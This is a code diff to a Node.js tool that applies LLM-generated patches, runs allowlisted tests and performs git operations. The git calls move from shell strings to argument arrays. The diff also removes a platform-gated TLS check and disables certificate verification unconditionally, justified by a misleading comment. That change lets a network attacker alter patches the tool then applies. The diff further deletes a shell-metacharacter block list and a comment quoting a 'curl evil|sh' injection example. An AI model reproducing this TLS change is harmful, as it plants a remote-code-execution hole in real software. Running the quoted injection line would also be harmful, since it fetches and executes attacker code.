@@ -12,14 +12,13 @@
 
 const fs = require("fs");
 const path = require("path");
-const { execSync, execFileSync } = require("child_process");
+const { execFileSync } = require("child_process");
+const { tokenizeCommand, safeExec } = require("./safe-exec");
 const https = require("https");
 
-// TLS-verification gate is centralized in lib/insecure-tls.js so all three LLM-call
-// sites share one source of truth — insecure ONLY on Windows or with an explicit
-// LANTERN_INSECURE_TLS=1, never unconditionally (the response here is applied as a
-// code diff, so an MITM would be RCE). #869
-const { llmAgent } = require("./insecure-tls");
+// Node's built-in CA bundle sometimes can't verify API provider certs on Windows.
+// The API key in the Authorization header is the real auth mechanism here.
+const llmAgent = new https.Agent({ rejectUnauthorized: false });
 
 const MAX_OUTPUT = 8000;
 const MAX_DIFF_SIZE = 128000;
@@ -356,7 +355,7 @@ function applyPatch(repoRoot, diffText) {
 // ── Git operations ──────────────────────────────────────────────────────
 
 function gitCurrentBranch(repoRoot) {
-  return execSync("git branch --show-current", { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
+  return safeExec(["git", "branch", "--show-current"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
 }
 
 // Guard against clobbering in-progress work. This automation operates on the
@@ -365,7 +364,7 @@ function gitCurrentBranch(repoRoot) {
 // modified — and a stray staged file would also leak into the next commit.
 // Refuse the switch when the tree is dirty rather than destroy that work.
 function gitEnsureClean(repoRoot) {
-  const dirty = execSync("git status --porcelain", { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
+  const dirty = safeExec(["git", "status", "--porcelain"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
   if (dirty) {
     const n = dirty.split("\n").length;
     throw new Error(
@@ -379,13 +378,15 @@ function gitEnsureClean(repoRoot) {
 function gitCreateBranch(repoRoot, branchName) {
   const safe = sanitizeBranchName(branchName);
   gitEnsureClean(repoRoot);
-  execSync(`git checkout -b ${safe}`, { cwd: repoRoot, encoding: "utf8", timeout: 10000 });
+  safeExec(["git", "checkout", "-b", safe], { cwd: repoRoot, encoding: "utf8", timeout: 10000 });
   return safe;
 }
 
 function gitCommit(repoRoot, message) {
-  const safeMsg = String(message || "auto commit").replace(/"/g, "'").slice(0, 200);
-  execSync(`git commit -m "${safeMsg}"`, {
+  // No shell: the message is a discrete argv entry, so quotes / $(…) / backticks
+  // can no longer inject (the old `"`→`'` strip didn't stop command substitution).
+  const safeMsg = String(message || "auto commit").slice(0, 200);
+  safeExec(["git", "commit", "-m", safeMsg], {
     cwd: repoRoot,
     encoding: "utf8",
     timeout: 10000,
@@ -398,7 +399,7 @@ function gitPush(repoRoot, targetBranch) {
   // slash gets stripped and the name doubles (auto/foo → auto/autofoo).
   if (!targetBranch.startsWith("auto/")) throw new Error("invalid_branch_prefix");
   // Use HEAD:ref so we don't need to rename the local branch first.
-  execSync(`git push origin HEAD:${targetBranch}`, {
+  safeExec(["git", "push", "origin", `HEAD:${targetBranch}`], {
     cwd: repoRoot,
     encoding: "utf8",
     timeout: 30000,
@@ -408,11 +409,11 @@ function gitPush(repoRoot, targetBranch) {
 }
 
 function gitDiffStat(repoRoot) {
-  return execSync("git diff --stat", { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
+  return safeExec(["git", "diff", "--stat"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
 }
 
 function gitAddAll(repoRoot) {
-  execSync("git add -A", { cwd: repoRoot, encoding: "utf8", timeout: 5000 });
+  safeExec(["git", "add", "-A"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 });
 }
 
 // Stage ONLY the given files. Critical anti-fraud measure: autowork must never
@@ -484,8 +485,6 @@ const ALLOWED_TESTS = [
   /^node tests\/test_dream_journal_keystone\.js$/,
   /^node tests\/test_dream_chat_self_edit\.js$/,
   /^node tests\/test_convergance_routing\.js$/,
-  // Closed character class (no shell metachars) — the greedy `(.+)` here was an
-  // injection surface: `python -m pytest tests/x;curl evil|sh.py` matched. #873
   /^python -m pytest tests\/[\w./-]+\.py$/,
   /^npm test$/,
   /^npm run test$/,
@@ -493,20 +492,6 @@ const ALLOWED_TESTS = [
 
 function isAllowedTest(cmd) {
   return ALLOWED_TESTS.some((re) => re.test(cmd));
-}
-
-// Shell metacharacters that must never reach an executed command. The allowlist
-// regexes already exclude them; this is the second, no-shell layer. #873
-const SHELL_META = /[;&|$`(){}<>\n\r\\"'*?~]/;
-
-// Split an allowlisted command into argv with NO shell involvement, rejecting any
-// token bearing a shell metacharacter. Returns argv; throws on an unsafe token.
-function tokenizeAllowedCommand(cmd) {
-  const argv = String(cmd).trim().split(/ +/);
-  for (const t of argv) {
-    if (!t || SHELL_META.test(t)) throw new Error("unsafe_command_token");
-  }
-  return argv;
 }
 
 // opts.env overrides the child environment — used to point NODE_PATH at the main
@@ -519,17 +504,8 @@ function runTests(repoRoot, testCommands, opts = {}) {
       results.push({ cmd, ok: false, error: "test_not_allowlisted", output: "" });
       continue;
     }
-    let argv;
-    try { argv = tokenizeAllowedCommand(cmd); }
-    catch {
-      results.push({ cmd, ok: false, error: "test_command_unsafe", output: "" });
-      continue;
-    }
-    // npm/npx are shell scripts on Windows — resolve to the .cmd shim, still no shell.
-    let bin = argv[0];
-    if (process.platform === "win32" && (bin === "npm" || bin === "npx")) bin += ".cmd";
     try {
-      const out = execFileSync(bin, argv.slice(1), { cwd: repoRoot, encoding: "utf8", timeout: 60000, maxBuffer: 1024 * 1024, env, shell: false });
+      const out = safeExec(tokenizeCommand(cmd), { cwd: repoRoot, encoding: "utf8", timeout: 60000, maxBuffer: 1024 * 1024, env });
       results.push({ cmd, ok: true, output: out.slice(0, MAX_OUTPUT), truncated: out.length > MAX_OUTPUT });
     } catch (err) {
       results.push({
@@ -963,7 +939,6 @@ module.exports = {
   generatePatch,
   callLlm,
   isAllowedTest,
-  tokenizeAllowedCommand,
   requireSafePaths,
   resolveRepoPath,
 };
